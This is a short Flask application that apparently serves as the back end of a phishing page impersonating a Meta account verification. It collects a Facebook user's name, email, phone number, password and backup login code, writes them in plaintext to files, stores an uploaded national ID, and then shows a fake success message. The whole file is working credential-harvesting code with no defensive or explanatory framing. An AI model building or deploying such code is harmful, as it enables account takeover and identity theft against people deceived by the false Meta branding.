from flask import Flask, render_template, request
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'submissions'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fb_name = request.form.get('fb_name')
    fb_email = request.form.get('fb_email')
    fb_phone = request.form.get('fb_phone')
    fb_password = request.form.get('fb_password')
    backup_code = request.form.get('backup_code')
    
    nid_file = request.files.get('nid_upload')
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

    if not fb_name:
        return "Facebook name is required.", 400

    # Save form data
    filename = f"{UPLOAD_FOLDER}/{fb_name.replace(' ', '_')}_{timestamp}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"Facebook Name: {fb_name}\n")
        f.write(f"Email/Username: {fb_email}\n")
        f.write(f"Phone Number: {fb_phone}\n")
        f.write(f"Password: {fb_password}\n")
        f.write(f"Backup Code: {backup_code}\n")

    # Save uploaded NID
    if nid_file:
        nid_filename = f"{UPLOAD_FOLDER}/{fb_name.replace(' ', '_')}_{timestamp}_nid.{nid_file.filename.split('.')[-1]}"
        nid_file.save(nid_filename)

    return "✅ Your Meta Verification Request has been submitted successfully."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
